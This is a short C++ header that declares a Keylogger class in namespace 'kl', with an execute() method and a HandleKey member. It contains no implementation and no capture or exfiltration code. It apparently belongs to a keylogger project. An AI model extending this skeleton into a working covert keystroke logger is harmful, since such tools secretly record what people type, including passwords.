#pragma once

#include "handle_key.hpp"
namespace kl {

class Keylogger {
public:
  void execute();

private:
  HandleKey handler_;

};

}
